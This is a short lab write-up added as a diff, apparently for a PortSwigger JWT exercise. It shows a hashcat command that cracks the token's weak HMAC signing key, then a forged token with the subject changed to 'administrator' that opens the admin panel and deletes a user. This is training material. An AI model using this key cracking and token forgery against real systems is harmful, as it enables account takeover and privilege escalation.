@@ -1,0 +1,23 @@
+Original JWT:
+    eyJraWQiOiI5OGQ2OGFkZS02OGM2LTRiYWEtYWQzNS0yMzk1ZjZhNDIzN2MiLCJhbGciOiJIUzI1NiJ9.eyJpc3MiOiJwb3J0c3dpZ2dlciIsImV4cCI6MTczNDA5NTc3NCwic3ViIjoid2llbmVyIn0._ZIYqSXc3ebHfb0HWRbVcQKN5UZIDV0gwnfavQQezA4
+    HEADER
+    {
+        "kid": "98d68ade-68c6-4baa-ad35-2395f6a4237c",
+        "alg": "HS256"
+    }
+    PAYLOAD
+    {
+        "iss": "portswigger",
+        "exp": 1734095774,
+        "sub": "wiener"
+    }
+
+We use hashcat to bruteforce the hash key used for the signing:
+    hashcat -a 0 -m 16500 <jwt_token> jwt.secrets.list
+
+    result: <jwt_token>:secret1 
+
+Tampered JWT (where "sub": "administrator") hashed with bruteforced key (secret1):
+    eyJraWQiOiI5OGQ2OGFkZS02OGM2LTRiYWEtYWQzNS0yMzk1ZjZhNDIzN2MiLCJhbGciOiJIUzI1NiJ9.eyJpc3MiOiJwb3J0c3dpZ2dlciIsImV4cCI6MTczNDA5NTc3NCwic3ViIjoiYWRtaW5pc3RyYXRvciJ9.Wazxq5BsErPRN7LfSFfi1CxpdPUQk5C0ljSskJSic-Q
+
+And indeed we get access to the admin panel where we can delete carlos' account
